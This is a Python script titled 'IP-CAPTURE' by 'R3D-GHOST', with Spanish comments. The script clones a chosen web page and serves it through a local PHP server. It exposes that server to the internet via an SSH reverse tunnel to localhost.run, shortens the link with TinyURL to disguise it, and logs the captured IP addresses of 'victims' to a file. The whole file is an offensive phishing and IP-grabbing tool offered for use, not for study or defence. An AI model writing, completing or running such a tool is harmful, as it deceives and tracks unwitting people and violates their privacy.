import os
import time
import requests
import pyshorteners
import threading

# Función para clonar una página web
def clonar(url):
    try:
        datos = requests.get(url)
        with open("index.html", "wb") as guarda:
            guarda.write(datos.content)
        
        shortened_url = get_shortened_link("http://localhost:8080")
        print("Link acortado:", shortened_url)
        
        return "Done..."
    except Exception as e:
        return f"Error: {str(e)}"

# Función para mostrar el banner y las opciones del menú
def banner():
    banner_text = "IP-CAPTURE"
    print(banner_text)
    print("By R3D-GHOST")
    os.system("pkill php")  # Cambiado 'killall' por 'pkill' para mayor compatibilidad
    os.system("clear")
    print(banner_text)
    print("1 Clonar WEB")
    print("2 EXIT")

    choice = input("Enter the number: ")

    if choice == "1":
        url = input("Enter the URL of the page you want to clone: ")
        datos = clonar(url)
        print(datos)
        server()

    elif choice == "2":
        print("Goodbye")

# Función para acortar un enlace
def get_shortened_link(url):
    try:
        s = pyshorteners.Shortener()
        shortened_url = s.tinyurl.short(url)
        return shortened_url
    except Exception as e:
        return f"Error acortando el enlace: {str(e)}"

# Función para ejecutar un comando en segundo plano
def bgtask(command):
    try:
        return os.system(command)
    except Exception as e:
        print(f"Error ejecutando el comando en segundo plano: {str(e)}")

# Verificar si Cloudflare está instalado
if not os.path.isfile('server/cloudflared'):
    print('\n\033[31m[!] Cloudflare no esta instalado.')
    print('\n\033[35m[~] Instalando cloudflare...')
    os.system("bash ltunnel.sh")

# Función para chequear la IP capturada
def check():
    while True:
        if os.path.isfile('ip.txt'):
            print('\n\033[94m[~] IP de la victima encontrado!')
            with open('ip.txt') as ip:
                lines = ip.read().rstrip()
                if lines:
                    print('\n\033[94m[~] IPs capturadas:')
                    print(lines)
                    with open('ip_guardadas.txt', 'a') as ip_guardadas:
                        ip_guardadas.write(lines + "\n")
                    print('\n\033[32m[~] IP guardados en: ip_guardadas.txt')
                    os.remove("ip.txt")

# Función para iniciar el servidor PHP
def server():
    os.system("clear")
    print('[~] Iniciando servidor php...')
    threading.Thread(target=ssh).start()
    os.system("clear")
    print('\n\033[34m[~] Link acortado:', get_shortened_link("http://localhost:8080"))
    print('\n\033[34m[~] Esperando datos...')
    check()

# Función para iniciar el túnel SSH y el servidor PHP
def ssh():
    os.system("php -S localhost:8080 > /dev/null 2>&1 &")
    os.system("ssh -R 80:localhost:8080 nokey@localhost.run > /dev/null 2>&1 &")

# Ejecutar el banner y el menú principal
if __name__ == "__main__":
    banner()
